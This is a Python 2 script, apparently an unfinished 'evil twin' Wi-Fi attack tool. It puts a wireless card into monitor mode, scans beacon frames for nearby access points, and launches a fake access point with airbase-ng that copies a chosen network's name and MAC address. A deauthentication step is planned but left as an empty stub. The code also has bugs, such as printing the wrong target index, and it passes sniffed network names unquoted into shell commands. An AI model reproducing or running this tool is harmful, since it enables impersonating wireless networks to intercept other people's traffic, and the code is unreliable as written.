#!/usr/bin/python

#Suppress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import multiprocessing
import threading, os, sys, argparse

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan

accessPoints = set()
accessPointsMAC = []
accessPointsNames = []
broadcast = "ff:ff:ff:ff:ff:ff"
iface = "wlan0"


#Parses used arguments
def parseArgs():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-i",
        "--interface",
        help = ("Choose an interface that supports monitor mode. Dflt: wlan0\n" +
                "Example: -i wlan1")
    )
    return parser.parse_args()

def switchToMonitorMode(iface):
    os.system("clear")

    print "[*] Switching " +iface+ " to Monitor Mode, please wait"
    os.system("airmon-ng start " +iface+ " > /dev/null 2>&1")
    print G+ "[*] Done." +W

    return iface + "mon"

#Starts channelHopper in a new process and starts sniffing the traffic
def startAPScanner(iface):
    print "[*] Starting the AP scanner"
    time.sleep(2)
    os.system("clear")
    print O+ "[*] " +C+ "Press Ctrl+c when scanner finds APs around you\n" +W

    p = multiprocessing.Process(target = channelHopper)
    p.start()
    sniff(iface=iface, prn=packetHandler)
    
    if KeyboardInterrupt:
        p.terminate()
    #If all else fails:
    #kill -9 `ps -ef | grep test.py | grep -v grep | awk '{print $2}'`

#Hops through 13 channels, changes channel every 100ms
def channelHopper():
    while True:
        for channel in range(1,14):
            os.system("iw dev wlan0mon set channel %d" % channel)
            time.sleep(0.1)

#Handles every captured packet while sniffing in startAPScanner
def packetHandler(pkt):
    if pkt.haslayer(Dot11Beacon):
       if pkt.info and (pkt.info not in accessPoints):
           print "     " +O+ str(len(accessPoints)+1) +W, pkt.addr3, O+ pkt.info +W
           accessPoints.add(pkt.info)
           accessPointsNames.append(pkt.info)
           accessPointsMAC.append(pkt.addr2)

def startFakeAP(choice):
    print G+ "[*] Twin AP running successfully" +W
    os.system("airbase-ng -e " +accessPointsNames[choice-1]+ \
                            " -c " +str(random.randrange(1,14))+ \
                            " -a " +accessPointsMAC[choice-1]+ \
                            " " +iface+ \
                            " > /dev/null 2>&1")

def startDeauth():
    print G+ "[*] Deauthing running successfully" +W
    #TODO
    #
    #
    #
    #
    #

#Main function
def engineStart():
    args = parseArgs()
    global iface
    iface = args.interface
    choice = 0
    deauth = multiprocessing.Process(target = startDeauth)

    #If no argument was given to parser
    if iface == None: 
        iface="wlan0"

    iface = switchToMonitorMode(iface)
    startAPScanner(iface)

    num_choice = int(raw_input("\n" +O+ "[*] " +C+ "Choose number of an access point as target: "+W))
    print "\nYou selected the " +O+ accessPointsNames[choice-1] +W+ " as target\n"
    
    choice = raw_input("Skip deauthentication phase? (y/n): ")

    if choice == "y":
        twin = multiprocessing.Process(target = startFakeAP, args=(num_choice,))
        twin.daemon = True
        twin.start()
    elif choice == "n":
        deauth.daemon = True
        deauth.start()

        twin = multiprocessing.Process(target = startFakeAP, args=(num_choice,))
        twin.daemon = True
        twin.start()
    else:
        print "Wrong answer, exiting..."
        sys.exit(1)
    
    if deauth.is_alive():
        time.sleep(10) #Just to see if process activates
        deauth.terminate()
        print "Turning deauth off"

    print "Test sleeping for 30 sec"
    time.sleep(30)
    engineStop(twin)

#Stops all processes and exits
def engineStop(twin):
    twin.terminate()

    print G+ "[*] Engine stopped successfully, farewell :)" +W

engineStart()